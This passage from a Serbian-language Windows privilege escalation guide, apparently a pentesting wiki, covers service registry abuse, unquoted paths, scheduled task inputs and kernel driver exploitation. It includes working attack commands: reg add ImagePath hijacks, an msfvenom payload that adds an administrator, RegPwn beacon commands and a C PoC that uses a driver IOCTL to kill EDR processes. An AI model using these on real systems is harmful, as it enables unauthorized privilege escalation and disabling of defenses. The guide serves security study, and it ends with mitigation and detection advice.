> Ako usluga ne dozvoljava običnom korisniku da je ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima podešenu akciju pri otkazu koja je ponovo pokreće ili može posredno da je pokrene aplikacija koja je koristi.

### Dozvole za izmenu registra usluga

Trebalo bi da proverite da li možete da izmenite neki registar usluge.\
Možete da **proverite** svoje **dozvole** nad **registrom** usluge na sledeći način:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Originalni test dozvola glasio je:

Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako ih imaju, može se izmeniti binarna datoteka koju servis izvršava.

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za upis u registar za određeni ključ servisa. Sam unos ACL-a ne dokazuje da je pristup efektivan: važni su unosi za odbijanje, trenutni token i nasleđene dozvole. Prava nad ključem registra razlikuju se od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad objektom servisa. Za eskalaciju su takođe potrebni upotrebljivo polje konfiguracije servisa, način da se servis pokrene i identitet servisa sa većim privilegijama. Pogledajte Microsoft reference za [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa simboličkim linkom u registru do proizvoljnog upisa vrednosti u HKLM (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju ključeve **ATConfig** za svakog korisnika, koje proces **SYSTEM** kasnije kopira u ključ sesije u HKLM-u. Trka pri korišćenju **simboličkog linka u registru** može da preusmeri taj privilegovani upis na **bilo koju putanju u HKLM-u**, čime se dobija mogućnost proizvoljnog **upisa vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijave ili prelaska na bezbednu radnu površinu i korisnik može da upisuje u njega.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Postavite vrednost **HKCU ATConfig** koju želite da upiše SYSTEM.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Pobeditе u trci** postavljanjem **oplock**-a na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite ključ **HKLM Session ATConfig** ključem **registry link** koji upućuje na zaštićeni cilj u HKLM-u.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu putanju u HKLM-u.

Kada dobijete mogućnost proizvoljnog upisa vrednosti u HKLM, pređite na LPE tako što ćete izmeniti konfiguracione vrednosti servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** u sklopu trke.

Primer alata (RegPwn BOF / samostalna verzija):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory za registar servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podregistre u njemu**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Putanje do servisa bez navodnika

Ako putanja do izvršne datoteke nije navedena pod navodnicima, Windows će pokušati da izvrši svaku putanju koja se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve putanje servisa koje nisu pod navodnicima, izuzimajući one koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti pomoću metasploit-a:** `exploit/windows/local/trusted\_service\_path` Možete ručno da napravite binarnu datoteku servisa pomoću metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija se može konfigurisati tako da upućuje na binarnu datoteku. Ako je moguće zameniti tu datoteku, možda je moguća eskalacija privilegija. Više detalja potražite u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljevi skripti planiranih zadataka

Kod omogućenog zadatka koji pokreće `cmd.exe /c` sa datotekom `.bat` ili `.cmd`, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell-a `-File`, proverite i ACL te navedene skripte; promenljive, uslovne naredbe i ulančavanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavljaju mogućnost za izvršavanje između naloga samo kada je principal konfigurisani za zadatak različit od pozivaoca i kada zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje može biti bitan za skripte, ali prethodni `exit` ili drugačiji tok izvršavanja mogu učiniti naknadno dodate redove nedostupnim. Pre nego što tvrdite da je moguća eskalacija, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija. Tokom inventarisanja ne menjajte skriptu niti pokrećite zadatak.

## Imenovani tokovi u dostupnim datotekama

Na NTFS-u, čitljiva datoteka može imati imenovani tok `:$DATA` čiji sadržaj nije prikazan u običnom izlistavanju direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **nazive i veličine** tokova pre otvaranja sadržaja; Windows ih izlaže preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell preko [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji upućuje na tajnu predstavlja samo trag. Proverite efektivni pristup čitanju datoteke, podršku datotečnog sistema za tokove, da li tok sadrži upotrebljive akreditive i kao koji nalog se oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazi pomoćnog programa Windows Driver Kit koji pokreću planirani zadaci

Opcioni Windows Driver Kit uključuje `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i datoteku projekta `working\rsf.rsf` iz svog direktorijuma za pokretanje. Planirani zadatak ili usluga koja pokreće ovaj pomoćni program uz privilegovani nalog može da pretvori pristup sa niskim privilegijama za upisivanje u te ulaze u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka zaštićena. Potvrdite da li ih koristi privilegovani proces i da li je moguće kreirati ili menjati **obe** prateće datoteke; samo pronalaženje pomoćnog programa nije dovoljno.

Kod planiranog zadatka, pregledajte njegovu radnju [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) i ACL-ove putanja do dve prateće datoteke. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke samo je trag koji treba proveriti, a ne dokaz o tome odakle zadatak čita ulaze. Mora biti ispunjen i preduslov za projektnu radnu datoteku. Proverite stvarni principal zadatka umesto da pretpostavljate da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole za binarne datoteke** (možda možete da zamenite neku od njih i eskalirate privilegije) i za **direktorijume** ([DLL Hijacking](dll-hijacking/index.html).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisivanja kada zamena ne bi uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite punu instaliranu verziju zakrpe i da li može da se pokrene operacija agenta na koju problem utiče; oznaka samo grane, poput `2.1`, ne može da utvrdi izloženost. Enumeracijom se mogu proveriti verzija, stanje servisa i dozvole za Temp, bez kreiranja datoteka ili pokretanja komandi agenta.

#### Pregled SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) uticao je na ADSelfService Plus build 6210 i starije; dobavljač ga je ispravio u buildu 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Stavka instaliranog proizvoda ili putanja servisa zato su samo trag, a ne potvrda ranjivosti: potvrdite tačan build, istoriju SAML konfiguracije, mrežnu dostupnost servisa i nalog pod kojim se izvršava. Izvršavanje koda preko servisa nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu koja radi kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda zaseban je trag o šifrovanoj rezervnoj kopiji, a ne dokaz da su joj akreditivi upotrebljivi niti da postoji ovaj SAML propust. Tokom uobičajene enumeracije zabeležite njenu putanju i prava pristupa, bez raspakivanja.

#### Kontroler Jenkins i granice naloga domena

Na Windows kontroleru Jenkins razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže drugi način pokretanja build-a, ali potvrdite da je omogućen i da se build zaista izvršava. Izvršavanje koristi identitet kontrolera ili izabranog agenta, a sačuvani akreditiv može da se koristi samo ako posao ima pristup njegovom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva materijal akreditiva i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup za čitanje potrebnih datoteka** i zaseban put ponovne upotrebe naloga, bez ispisivanja tajni u deljenom izlazu. Ako taj nalog ima pravo upisivanja u `scriptPath` AD korisničkog objekta, potvrdite da je putanja za skriptu upisiva i da postoji stvarni korisnik za prijavljivanje ili zakazani potrošač koji radi kao ciljni korisnik, pre nego što to tretirate kao izvršavanje između korisnika. Za dodatnu kontrolu grupa potrebno je zasebno proveriti efektivna AD prava.

#### Identitet samostalno hostovanog agenta Azure Pipelines

Za projekat Azure DevOps Server ili Azure Pipelines razlikujte dozvolu za **kreiranje ili izmenu** pipeline-a od dozvole za njegovo **stavljanje u red** i korišćenje izabranog skupa agenata; [Microsoft nezavisno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju skupa agenata](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje skriptni korak i pokrene taj pipeline na samostalno hostovanom Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre nego što tvrdite da dolazi do prelaska na drugi korisnički nalog ili SYSTEM, proverite tačan pipeline, ograničenja grane/resursa, autorizovani skup agenata, posao koji može da se pokrene i identitet servisnog naloga agenta. Instaliran agent, uloga u projektu ili dozvola za upisivanje u repozitorijum sami po sebi su samo trag; pregledajte dozvole i lokalne metapodatke servisa bez pokretanja build-a tokom pasivne enumeracije.

#### Akreditivi za Microsoft Entra Connect Sync

[Microsoft pravi razliku](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) između **servisnog naloga ADSync**, koji pokreće servis za sinhronizaciju i pristupa njegovoj SQL bazi podataka, i **naloga konektora AD DS**, čije dozvole u direktorijumu zavise od konfigurisаних funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, a ključni materijal je [zaštićen pomoću DPAPI-ja u okviru servisnog naloga ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Instaliran servis za sinhronizaciju, lokalna grupa čije ime zvuči kao administratorska ili sam pristup bazi podataka ne dokazuju da je akreditiv moguće dešifrovati niti da postoji put do eskalacije u domenu. Zasebno proverite stvarna prava čitanja baze podataka, pristup servisnog naloga/ključevima, raspored instalacije i SQL-a, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Uobičajena enumeracija treba da prikazuje samo metapodatke servisa i pristupa, a ne da upituje ili ispisuje sačuvane tajne.

#### Dozvole za DLL-ove za podršku upravljačkog programa štampača

Instalirani upravljački program štampača može da čuva DLL-ove za podršku u `C:\ProgramData` i da ih učitava u privilegovanijem procesu za štampanje. Proverite tačan direktorijum upravljačkog programa i ACL-ove DLL-ova, uključujući nadređene direktorijume i tačke ponovne analize, čak i ako je enumeracija WMI-ja za štampače zabranjena. Za [problem u upravljačkom programu štampača Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), prijavljena putanja bila je `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [prvobitno otkrivanje](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL-a od strane `PrintIsolationHost.exe`. ACL koji dozvoljava upisivanje samo je trag: proverite efektivni pristup upisivanju nakon primene stavki zabrane, da li je relevantni upravljački program instaliran i učitava li datoteku pod privilegovanim identitetom, kao i da li je dobavljač ažuriranim upravljačkim programom ili bezbednosnim programom ispravio instalaciju. Nemojte zaključivati da postoji ranjivost samo na osnovu imena direktorijuma ili verzije upravljačkog programa.

### Dozvole za upisivanje

Proverite da li možete da izmenite neku konfiguracionu datoteku da biste pročitali neku posebnu datoteku ili da li možete da izmenite izvršnu datoteku koju će pokrenuti administratorski nalog (schedtasks).

Slabe dozvole za direktorijume/datoteke u sistemu možete da pronađete ovako:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ automatski učitava svaki plugin DLL koji se nalazi u njegovim podfolderima `plugins`. Ako postoji instalacija koja se može menjati (portable/copy), ubacivanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući iz `DllMain` i callback funkcija plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri pokretanju

**Proverite da li možete da prepišete neki registar ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **lokacijama za autoruns za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **čudne/ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže primitivu za proizvoljno čitanje/pisanje u kernelu (što je često slučaj kod loše dizajniranih IOCTL rukovalaca), možete eskalirati privilegije tako što ćete direktno ukrasti SYSTEM token iz memorije kernela.<sup>[[13]](#references)</sup> Tehniku korak po korak pogledajte ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Povezani materijali o Windows kernel exploitation-u:

Za slučaj kernel-mode ring-buffer-a sa registrima za čitanje/pisanje koje može da upisuje korisnik, pogledajte [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod bugova sa race condition-om, gde ranjivi poziv otvara putanju u Object Manager-u koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF-ovi u cancel-safe queue-u, otkrivanje paged-pool-a i I/O ring pivot-i

Neki Windows kernel LPE lanci mogu se sastaviti od dva zasebno slaba buga: **race condition-a u životnom ciklusu cancel-safe queue-a** koji oslobađa zahtev/CBD dok je zaključavanje reda i dalje aktivno, i otkrivanja **zaključavanje se otpušta pre kopiranja** koje otkriva oslobođenu paged-pool alokaciju tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Beleške za audit i exploitation:

- **Oslobađanje pod zaključavanjem + naknadno otkazivanje**: potražite putanju uspeha koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja otkazivanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspeha stigne do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otpuštanja CBDQ/CSQ zaključavanja, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` nazad u callback driver-a za uklanjanje.
- **Ponovo zauzmite oslobođeni queue objekat** alokacijom paged-pool-a iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se sadržaj i veličina mogu kontrolisati, a kasnije se mogu ispitati pomoću pipe read/peek operacija. Ako oslobođeni objekat sadrži list links, prepišite ih **cikličnom listom lažnih request čvorova u korisničkoj memoriji**, kako bi driver više puta obrađivao strukture zahteva koje definiše napadač, umesto da se zaustavi na originalnoj glavi liste.
- **Unapredite predvidivo pisanje**: ako lažni zahtev preusmeri ugnježdeni context pointer koji se koristi za bookkeeping zapise (timestamps / QPC / susedna refcount polja), možda ćete dobiti kernel write čiju adresu možete kontrolisati, ali ne i vrednost. U tom slučaju, ciljajte polje **length/size** objekta iz pool spray-a umesto konačnog code/data pointer-a, pa zatim ispitujte spray dok korumpirani objekat ne omogući **out-of-bounds čitanje iz paged-pool-a**.
- **Obrazac otkrivanja podložan race condition-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se poboljšava kada napadač može da poveća bafer koji se kopira (na primer, dodavanjem mnogo list/resource unosa koji povećavaju konačnu veličinu alokacije serializer-a), jer duže kopiranje produžava vremenski prozor za zamenu, a da pritom ne mora nužno da sruši sistem.
- **Ciljevi za dopunu sa mnogo pointer-a**: Windows **I/O ring** nizovi registrovanih bafera odlični su ciljevi za otkrivanje, jer je njihova veličina u paged-pool-u pod kontrolom napadača (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, pa zatim korumpirajte **`RegBuffers`** i **`RegBuffersCount`** kako bi naredne I/O ring operacije koristile falsifikovane unose i omogućile proizvoljno čitanje/pisanje u kernelu. Ako je jedino dostupno pisanje ono koje daje stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), upotrebite **preklapajuća neporavnata pisanja** da sastavite ponavljajući korisnički pointer kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i tamo smestite falsifikovani niz registrovanih bafera.<sup>[[30]](#references)</sup>

Korisni indikatori za debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz oštećenog I/O ring-a dobijete proizvoljan kernel read/write, ukradite SYSTEM token standardnim postupkom nakon dobijanja primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive za korupciju memorije u registry hive-ovima

Savremene ranjivosti u hive-ovima omogućavaju pripremu determinističkih rasporeda, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje korupcije metapodataka u prekoračenja kernel paged-pool-a bez prilagođenog driver-a. Ceo lanac je opisan ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pogrešna interpretacija tipa u direktnom režimu `RtlQueryRegistryValues` sa putanjama pod kontrolom napadača

Neki driver-i prihvataju putanju registry-ja iz userland-a, proveravaju samo da li je to ispravan UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i upisuju rezultat u skalarni tip na стаку kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` се интерпретира према **стварном** типу registry вредности, а не типу који је програмер очекивао.

Ово омогућава две корисне primitive:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: апсолутна путања `\Registry\...` под контролом корисника омогућава driver-у да испитује кључеве које је изабрао нападач, открива постојање кључева преко повратних кодова/логова и понекад чита вредности којима позивалац не би могао директно да приступи.
- **Корупција kernel меморије**: скаларно одредиште као што је `&readValue` погрешно се тумачи као `REG_QWORD`, `UNICODE_STRING` или бафер бинарних података одређене величине, у зависности од типа registry вредности.

Практичне напомене за експлоатацију:

- **Мера ублажавања у Windows 8+**: ако упит погоди **непоуздан hive** са `RTL_QUERY_REGISTRY_DIRECT`, али без `RTL_QUERY_REGISTRY_TYPECHECK`, kernel позиваоци доживљавају пад са `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Да би рањивост остала експлоатабилна, потражите **кључеве унутар поузданих системских hive-ова у које нападач може да уписује**, уместо да постављате вредности у `HKCU`.
- **Постављање вредности у поузданом hive-у**: користите NtObjectManager да набројите потомке `\Registry\Machine` у које може да се уписује, а затим поновите скенирање са дупликованим токеном **low-integrity** да бисте пронашли кључеве доступне из контекста sandbox-а:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u 4-bajtni `int` oštećuje susedne podatke na steku i može delimično da prepiše obližnji callback/pokazivač funkcije.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita napadačev `REG_DWORD` na skalarni podatak na steku, a zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava polukontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo upotrebljenom skalarnom podatku, sledeći upit `REG_BINARY` kopira napadačeve bajtove direktno preko susednih polja na steku. To je često najjednostavniji način da se u potpunosti prepiše pokazivač callback funkcije.

Snažan obrazac za traženje: čitanja različitih tipova iz registra u istu promenljivu na steku, bez ponovne inicijalizacije. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo upotrebljene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će se izvršiti drugo čitanje.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + gašenje EDR-a)

Neki potpisani upravljački programi trećih strana kreiraju objekat uređaja sa jakim SDDL-om pomoću IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Без ове заставице, безбедни DACL се не примењује када се уређају приступа путем путање која садржи додатну компоненту, што сваком непривилегованом кориснику омогућава да добије ручку користећи путању именског простора као што је:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (из случаја из стварног света)

Када корисник може да отвори уређај, привилеговани IOCTL-ови које управљачки програм излаже могу се злоупотребити за LPE и неовлашћене измене. Примери могућности уочених у пракси:
- Враћање ручки са пуним приступом произвољним процесима (крађа токена / SYSTEM љуска путем DuplicateTokenEx/CreateProcessAsUser).
- Неограничено читање/писање сировог диска (неовлашћене измене ван мреже, трикови за постојаност при покретању система).
- Обустављање произвољних процеса, укључујући Protected Process/Light (PP/PPL), што омогућава гашење AV/EDR-а из корисничког режима путем кернела.

Минимални PoC образац (кориснички режим):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Ublažavanje rizika za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite prekid procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite modele sa posrednikom umesto direktnih privilegija kernela.

Ideje za detekciju za odbranu
- Nadgledajte otvaranja sumnjivih naziva uređaja iz korisničkog režima (npr. \\ .\\amsdk*) i specifične sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih stavki.


